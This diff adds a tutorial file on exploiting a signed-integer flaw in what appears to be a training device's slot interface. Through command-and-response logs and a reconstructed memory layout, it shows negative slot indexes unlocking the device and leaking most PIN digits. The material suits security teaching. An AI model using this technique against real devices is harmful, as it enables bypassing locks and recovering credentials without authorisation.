@@ -1,0 +1,119 @@
+tutorial1 signed integer bug exploitation
+-----------------------------------------
+
+1) Black box exploitation
+
+You can try to play with slot indexes to see what happens.
+Try to send above normal slot indexes:
+> tobin.py r\b3A r\b3b r\b55 r\bff | senda
+< ready
+<r:
+<error
+<r;
+<error
+<rU
+<error
+<r@
+<error
+You can try with writes, increments, ... No luck with that. There seem to be a check.
+
+What now if you pass a value below "0" ?
+>tobin.py r\b2f r\b2e r\b2d r\b2c | senda
+<ready...
+<r/
+<error
+<r.
+<error
+<r-
+<1
+<ok
+<r,
+<error
+
+Interesting. "r-" (r\b2d) returned ok with a value of 1.
+It seems negative values for slot are not always checked.
+
+Let's try to write to the same negative slot:
+>senda w-0 s
+<w-0
+<ok
+<s
+<device unlocked
+
+We could write too, and we unlocked the SD !!!!
+
+
+2) White box exploitation
+
+Looking at binary (or source code) you can see reverse the structure of the slots
+struct slot_s
+{
+	unsigned char value;
+	unsigned char access; /* 1 for READ, 2 for WRITE, 4 for INCREMENT, 8 for UNLOCKED */
+};
+
+struct info_s
+{
+  char           locked;
+  char           error; / set to 0xFF before starting */
+  unsigned char password[4];
+  struct slot_s slot[MAX_SLOT];
+};
+
+locked     slot - 3 value
+error      slot - 3 rights
+--------------------------   
+PIN #1     slot - 2 value
+PIN #2     slot - 2 rights
+--------------------------   
+PIN #3     slot - 1 value
+PIN #4     slot - 1 rights
+--------------------------   
+slot0      slot 0   value
+           slot 0   rights
+--------------------------   
+slot1
+...
+
+So with negative slots, you can try to access password (PIN) data and locked status.
+The value 1 you could see with slot -3 (0x2d) is the locked status. The access value would be given by the error field.
+Since its 0xFF, means all rights are granted, that's why we could read and write to it and unlock the device.
+
+Now let's try to read the password.
+Slot -2 can access value of first password digit. The access rights are in second password digit.
+Slot -1 can access value of third password digit. The access rights are in fourth password digit.
+Try slot -2 first:
+> tobin.py r\b2e w\b2e i\b2e | senda
+Returns only errors. Probably means that password[2] bit 3 is 0 (no rights when locked).
+Let's do the same but with device unlocked:
+>tobin.py w-0 r\b2e w\b2e i\b2e | senda
+<w-0
+<ok
+<r.
+<50
+<ok
+<w.
+<error
+<i.
+<error
+
+Since read are allowed, you can read the value of the first digit (50="2").
+You can guess the value of the second digit. It has only READ access rights. So it's 4 least significant bits are 0x1.
+Since it's a digit, it must be 0x31 ("1").
+
+Now we can do the same for slot -1:
+No access rights when device is locked, but when device is unlocked:
+>tobin.py w-0 r\b2f w\b2f i\b2f | senda
+<w-0
+<ok
+<r/
+<error
+<w/
+<error
+<i/
+<ok
+Only increment rights, so last digit is "4".
+Unfortunatly, with no read or write access on 3rd digit, no way know it's value directly.
+But since you guessed 3 of the 4 digits, you only have 10 tries at worse to find the last one.
+
+
